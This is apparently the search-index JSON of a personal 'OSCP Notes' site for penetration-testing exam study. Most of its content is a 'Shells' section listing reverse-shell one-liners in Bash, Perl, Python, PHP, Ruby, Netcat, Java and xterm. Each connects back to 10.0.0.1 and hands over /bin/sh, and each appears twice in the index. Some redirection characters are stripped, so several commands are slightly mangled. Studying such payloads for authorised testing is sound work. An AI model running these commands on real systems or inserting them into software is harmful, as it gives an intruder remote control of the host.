{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OSCP Notes","title":"OSCP Notes"},{"location":"#oscp-notes","text":"","title":"OSCP Notes"},{"location":"enumeration/","text":"SMPT SNMP NetBios SQL","title":"Enumeration"},{"location":"enumeration/#smpt","text":"","title":"SMPT"},{"location":"enumeration/#snmp","text":"","title":"SNMP"},{"location":"enumeration/#netbios","text":"","title":"NetBios"},{"location":"enumeration/#sql","text":"","title":"SQL"},{"location":"shells/","text":"Bash bash -i /dev/tcp/10.0.0.1/8080 0 1 Perl perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);' PHP php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' Ruby ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)' Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f Java r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor() xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorise the target to connect to you (command also run on your host): xhost +targetip Most of these are directly copied from pentestmonkey","title":"Shells"},{"location":"shells/#bash","text":"bash -i /dev/tcp/10.0.0.1/8080 0 1","title":"Bash"},{"location":"shells/#perl","text":"perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};'","title":"Perl"},{"location":"shells/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);'","title":"Python"},{"location":"shells/#php","text":"php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );'","title":"PHP"},{"location":"shells/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)'","title":"Ruby"},{"location":"shells/#netcat","text":"nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f","title":"Netcat"},{"location":"shells/#java","text":"r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor()","title":"Java"},{"location":"shells/#xterm","text":"One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorise the target to connect to you (command also run on your host): xhost +targetip Most of these are directly copied from pentestmonkey","title":"xterm"},{"location":"tools/","text":"Enumeration LinEnum.sh","title":"Tools"},{"location":"tools/#enumeration","text":"","title":"Enumeration"},{"location":"tools/#linenumsh","text":"","title":"LinEnum.sh"},{"location":"useful links/","text":"Reddit https://www.reddit.com/r/oscp/ Blogs https://highon.coffee/ https://www.gnucitizen.org/ Techniques https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/","title":"Useful Links"},{"location":"useful links/#reddit","text":"https://www.reddit.com/r/oscp/","title":"Reddit"},{"location":"useful links/#blogs","text":"https://highon.coffee/ https://www.gnucitizen.org/","title":"Blogs"},{"location":"useful links/#techniques","text":"https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/","title":"Techniques"}]}